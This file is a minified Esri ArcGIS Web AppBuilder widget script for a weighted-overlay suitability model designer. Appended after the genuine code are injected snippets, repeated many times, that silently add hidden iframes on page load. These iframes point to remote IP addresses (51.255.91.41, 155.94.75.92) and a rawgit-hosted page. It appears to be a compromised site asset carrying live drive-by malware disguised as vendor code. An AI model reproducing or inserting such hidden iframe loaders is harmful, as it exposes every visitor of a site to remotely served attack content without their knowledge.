// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/SuitabilityModeler/wro/templates/WeightedOverlayModelDesigner.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"header"\x3e\r\n    \x3cdiv class\x3d"model-colormap pull-right"\x3e\r\n      \x3cspan data-dojo-attach-point\x3d"colormapSelectorNode"\x3e\x3c/span\x3e\r\n    \x3c/div\x3e\r\n    \x3ch4\x3e\x3cspan class\x3d"bullet-number"\x3e2\x3c/span\x3e${i18n.wro.designModelCaption}\x3c/h4\x3e\r\n    \x3cdiv class\x3d"layer-visibility"\x3e\r\n      \x3clabel\x3e${i18n.wro.visible}:\r\n        \x3cinput type\x3d"checkbox" disabled\x3d"disabled"\r\n          data-dojo-attach-point\x3d"visibleModelNode"  /\x3e\r\n      \x3c/label\x3e\r\n      \x3clabel\x3e${i18n.wro.transparency}:\x3c/label\x3e\r\n      \x3cspan  class\x3d"modeler-transparency-slider" style\x3d"width:150px;"\r\n        data-dojo-attach-point\x3d"sliderNode"\r\n        data-dojo-type\x3d"dijit/form/HorizontalSlider"\r\n        data-dojo-props\x3d"minimum: 0, maximum:1, value: 0.0, intermediateChanges:true, showButtons:false" \x3e\r\n      \x3c/span\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"body"\x3e\r\n    \x3cdiv class\x3d"weighted-overlay-layer-editors"\r\n      data-dojo-attach-point\x3d"containerNode" \x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"weight-pct weight-pct-total"\x3e\r\n      \x3cdiv class\x3d"weight-pct-label"\x3e${i18n.wro.total}: \x3c/div\x3e\r\n      \x3cdiv class\x3d"weight-pct-total-wrapper"\r\n        data-dojo-attach-point\x3d"weightTotalWrapper" \x3e\r\n        \x3cspan data-dojo-attach-point\x3d"weightTotalNode"\x3e\x3c/span\x3e \x26#37;\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/array dojo/on dojo/Evented dojo/dom-class dojo/dom-attr dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dijit/_Container dijit/form/DropDownButton dijit/DropDownMenu dijit/MenuItem ./containerUtils ./WeightedOverlayLayerEditor ./Colormap dojo/text!./templates/WeightedOverlayModelDesigner.html dijit/form/HorizontalSlider".split(" "),function(k,f,e,l,c,g,m,n,p,q,r,t,u,v,w,h,x){return k([m,n,p,q,l],{i18n:null,templateString:x,baseClass:"weighted-overlay-model-designer",
_isValid:!1,buildRendering:function(){this.inherited(arguments);this.colormap=new h({context:this.context,i18n:this.i18n});this.ColormapSelector=new r({},this.colormapSelectorNode);this.ColormapSelector.containerNode.appendChild(this.colormap.domNode)},postCreate:function(){var a=this,b=this.sliderNode;e(b,"change",function(){a.weightedOverlayService&&a.weightedOverlayService.imageServiceLayer&&a.weightedOverlayService.imageServiceLayer.setOpacity(1-b.value)});var d=this.visibleModelNode;e(d,"change",
function(){a.weightedOverlayService&&a.weightedOverlayService.imageServiceLayer&&a.weightedOverlayService.imageServiceLayer.setVisibility(d.checked);b.disabled=!d.checked});b.set("value",0);d.checked=!1},_setModelAttr:function(a){this.setModel(a)},_setWeightedOverlayServiceAttr:function(a){this.setWeightedOverlayService(a)},startup:function(){this.inherited(arguments);this.validate()},setWeightedOverlayService:function(a){var b=this;this.weightedOverlayService=a;var d=new t({style:"display: none;"});
f.forEach(this.weightedOverlayService.colormapDefinitions,function(a){var c=new u;(new h({context:b.context,i18n:b.i18n,definition:a})).placeAt(c.containerNode);b.own(e(c,"Click",function(){b.colormap&&b.colormap.definition!==a&&b.colormap.set("definition",a);b.model.colormapDefinition=a;b.runModel()}));c.containerNode.title=a.label;d.addChild(c)});this.ColormapSelector.set("dropDown",d);this.own(e(d,"open",function(){var a=this.domNode.parentElement;a&&c.add(a,b.baseClass+"-popup")}));this.weightedOverlayService.imageServiceLayer&&
this._toggleModelLayer(this.weightedOverlayService.imageServiceLayer.visible)},clearModel:function(){this.setModel(this.weightedOverlayService.createNewModel());this.emit("model-clear",this.model)},setModel:function(a){var b=this;this.model=a;v.removeChildren(this);this.model.overlayLayers&&this.model.overlayLayers.length&&0<this.model.overlayLayers.length?f.forEach(this.model.overlayLayers,function(a){a=new w({context:b.context,i18n:b.i18n,overlayLayer:a});b.own(e(a,"WeightChange",function(){b.validate()}));
a.startup();b.addChild(a)}):(this.hideModelLayer(),g.set(this.visibleModelNode,"disabled","disabled"),this.weightedOverlayService&&this.weightedOverlayService.clearModel());this.validate();this.model.colormapDefinition&&this.colormap.set("definition",this.model.colormapDefinition)},validate:function(){var a=0;this.model&&this.model.overlayLayers&&f.forEach(this.model.overlayLayers,function(b){a+=b.weight});this.weightTotalNode.innerHTML=a;var b=this.weightTotalWrapper.parentNode;100===a?(this._isValid=
!0,c.remove(b,"alert-danger"),c.add(b,"alert-success")):(this._isValid=!1,c.remove(b,"alert-success"),c.add(b,"alert-danger"));this.emit("model-validated",this._isValid)},runModel:function(a){this.validate();this._isValid&&(this.weightedOverlayService.runModel(this.model),g.remove(this.visibleModelNode,"disabled"),this.showModelLayer(),this.emit("model-run",{options:a,model:this.model}))},showModelLayer:function(){this._toggleModelLayer(!0)},hideModelLayer:function(){this._toggleModelLayer(!1)},_toggleModelLayer:function(a){!!this.visibleModelNode.checked!==
a&&this.visibleModelNode.click()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});